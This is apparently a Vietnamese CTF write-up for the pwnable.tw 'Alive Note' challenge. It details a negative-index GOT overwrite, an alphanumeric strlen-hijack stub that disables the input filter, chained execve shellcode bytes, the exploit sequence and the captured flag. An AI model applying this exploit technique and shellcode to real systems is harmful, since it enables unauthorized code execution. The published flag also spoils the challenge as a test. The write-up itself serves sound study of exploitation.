+++
title = 'Pwnable.tw - Alive Note'
date = 2026-09-21T09:37:54+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Alive Note

`nc chall.pwnable.tw 10300`

Hint trên trang: *"The last 23 days, write down your shellcode."*

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Alive Note/alive_note
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

`readelf -l` cho thấy `GNU_STACK ... RWE`, còn LOAD chứa `.data/.bss` chỉ `RW` (không exec). Trên kernel 32-bit cũ của remote thì brk heap exec được; trên kernel local hiện đại nó bị map NX, nên để verify local phải dùng một shim `LD_PRELOAD` (`personality(READ_IMPLIES_EXEC)` + parse `/proc/self/maps` + `mprotect` heap RWX). Payload gửi đi không đổi.

Dịch vụ ghi chú 32-bit, menu: add a name / show a name / delete a name / exit. `add_note` đọc index bằng `atoi`, đọc `Name` tối đa 8 byte, validate từng byte bằng `check()`, rồi `note[idx] = strdup(name)`. `show_note` in `note[idx]` bằng `%s`. `del_note` làm `free(note[idx]); note[idx] = 0`.

#### Bug - index âm

```c
idx = read_int();           // atoi của tối đa 15 byte không lọc
if (idx > 10) { puts("Out of bound !!"); exit(0); }   // chỉ chặn cận TRÊN
... note[idx] ...                                      // không chặn cận dưới
```

`idx` là `int` có dấu nên `note + idx*4` với `note = 0x804a080` đi được tới mọi địa chỉ align 4 byte, trong đó GOT nằm ngay phía dưới:

- `add_note` → **ghi tuỳ ý 4 byte** một con trỏ heap của `strdup`
- `show_note` → đọc tuỳ ý qua con trỏ đó
- `del_note` → `free` tuỳ ý `note[idx]` cộng một lần ghi 0

`Name` bị `check()` lọc còn đúng `[0-9A-Za-z ]` (verify trong disassembly: `cmp al,0x20` và bit `0x8` của `__ctype_b`), nên payload `strdup` bị ràng buộc byte. Buffer của `read_int` (15 byte) thì không lọc, nhưng nó nằm trên stack và chỉ 15 byte.

### 2. Khai thác

Viết shellcode alphanumeric bằng tay thì rất khổ: không có `ret`/`jmp`/`mov` nào thuộc bảng chữ cái, và giữa các vùng user của chunk heap còn một khoảng header 8 byte không phải code (`00 00 00 00 11 00 00 00`).

Lời giải thực tế nhỏ hơn nhiều: **vô hiệu hoá luôn cái validator** thay vì sống trong bảng chữ cái của nó. `check()` lặp `for (i = 0; strlen(s) > i; i++)`. Nếu `strlen` bị hijack thành một stub trên heap trả `eax = 0` thì thân vòng lặp không bao giờ chạy và `check` trả 1 - byte của `Name` từ đó hoàn toàn không bị lọc, cắm shellcode `execve` bình thường được.

#### Chỉ số đo được

```js
note        = 0x804a080
strlen@got  = 0x804a028  -> index (0x804a028 - 0x804a080)/4 = -22
free@got    = 0x804a014  -> index (0x804a014 - 0x804a080)/4 = -27
```

#### Stub `strlen` toàn alnum

Một chunk `0x10`, mọi byte đều alnum:

```asm
6a 30   push 0x30
58      pop eax                 ; eax = 0x30
34 30   xor al, 0x30            ; eax = 0 ; OF = 0  (XOR xoá OF/CF)
71 4a   jno +0x4a               ; ip = P+7 -> P+0x51 = F+1
```

`jno` rơi vào hai byte sau một chunk `0x10` **đã được free** là `F = P + 0x50`. Vì free một chunk vào fastbin ghi `fd` của nó (một con trỏ heap `G`) tại `F+0..3`, byte tại `F+1` là `(G >> 8) & 0xff`. Nếu byte đó là `0xc3` thì nó là `ret`, stub trả `eax = 0` về `check` và validation pass.

Layout đo được (dump pwndbg thô trong work log):

```js
chunk cùng cỡ liên tiếp cách nhau 0x10; 8 byte user + khoảng header cố định
harness run:    note[k] user = heap_base + 0x200008 + 0x10*k
no-harness run: note[0] user = base + 0x8
```

Chọn chunk đã free `G` ở allocation index 48 làm byte thứ hai của `fd` thành `((heap_base >> 12) & 0xf) << 4 | 3`. Nó bằng `0xc3` khi và chỉ khi bit 12-15 của `heap_base` bằng `0xc` - **1/16 mỗi kết nối**, cứ retry với timeout ngắn. Chỉ nibble cao là ngẫu nhiên; nibble thấp `3` cố định nhờ chọn offset chunk có bit 8-11 bằng 3.

#### Shellcode chạy xuyên nhiều chunk

Sau khi filter đã tắt, mỗi `Name` là 8 byte tuỳ ý. Để chạy code trải nhiều chunk, mỗi chunk giữ 5 byte payload cộng `71 09` (`jno +9`), nên `ip = chunk+7 + 9 = chunk+16` = vùng user của chunk kế tiếp - nhảy qua khoảng header không phải code. `OF` được ép về 0 bằng `xor al,0x30` ở chunk đầu.

```asm
C0: 34 30 90 90 90 71 09 90      xor al,0x30 ; jno +9
C1: 6a 0b 58 99 52 71 09 90      push 0xb; pop eax; cdq; push edx ; jno +9
C2: 68 2f 2f 73 68 71 09 90      push "//sh" ; jno +9
C3: 68 2f 62 69 6e 71 09 90      push "/bin" ; jno +9
C4: 89 e3 31 c9 cd 80 90 90      mov ebx,esp; xor ecx,ecx; int 0x80
```

`free@got` trỏ vào `C0`; một `del_note` sau đó làm `free@plt` nhảy vào chuỗi và chạy `execve("/bin//sh", NULL, NULL)`.

#### Trình tự

1. 48 lần add filler (dùng lại index 0) → chunk 0..47; lần add kế tiếp là chunk 48 = `G` (`note[0]`)
2. chunk 49..56 = `A0..A7` (index 1..8); `A0 = P` (stub), `A5 = F = P+0x50`
3. `del_note(0)` free `G`; `del_note(6)` free `F` (nên `F.fd = G`); `del_note(1)` free `P`
4. `add_note(-22, STUB)` dùng lại `P` → `strlen@got = P`, nội dung là stub
5. Lần add đầu tiên đã bypass (`Name = b'A\xc3'+...`) → `check` chạy stub → `ret` tại `F+1` → trả 0 → `strdup` dùng lại `F` và ghi `0xc3` tại `F+1`, nên stub tiếp tục hoạt động cho mọi lần gọi sau
6. `add_note(-27, C0)` dùng top → `free@got = chunk57`; `C1..C4` → chunk 58..61
7. `del_note(0)` → `free(note[0])` → PLT `jmp [free@got]` → `C0..C4` → `execve` → shell

Local trúng ở lần thử 24, remote trúng ở lần thử 6:

```bash
uid=1000(alive_note) gid=1000(alive_note) groups=1000(alive_note)
FLAG{Sh3llcoding_in_th3_n0t3_ch4in}
```

`FLAG: FLAG{Sh3llcoding_in_th3_n0t3_ch4in}`

Hai điều đáng nhớ: khi validator ràng buộc byte của payload, hãy tìm **hàm phụ mà nó gọi** (`strlen`, `atoi`, `strchr`, `__ctype_*`) và hijack cái đó thay vì ngồi encode payload - cho `strlen` trả 0 thường là đủ để biến một vòng "duyệt từng ký tự" thành no-op. Và các byte lệnh không alnum (`0xc3` = `ret`) có thể **nhặt từ byte của con trỏ bị ASLR**: free một chunk lưu lại con trỏ heap mà byte thứ hai có nibble thấp do ta chọn (offset allocation) và nibble cao ngẫu nhiên (retry 1/16) - thường rẻ hơn viết hẳn một encoder alphanumeric.
